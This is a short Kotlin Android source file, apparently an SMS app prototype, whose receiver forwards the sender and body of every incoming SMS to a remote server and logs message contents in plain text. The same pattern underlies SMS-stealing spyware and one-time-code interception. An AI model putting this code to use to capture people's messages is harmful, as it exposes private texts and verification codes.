package com.example.smsmvp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {
    private val TAG = "SmsReceiver"
    
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            
            for (message in messages) {
                val sender = message.originatingAddress ?: "Unknown"
                val body = message.messageBody ?: ""
                
                Log.d(TAG, "SMS received from: $sender, body: $body")
                
                // Send SMS data to server
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        Net.sendSmsToServer(sender, body)
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to send SMS to server", e)
                    }
                }
            }
        }
    }
}
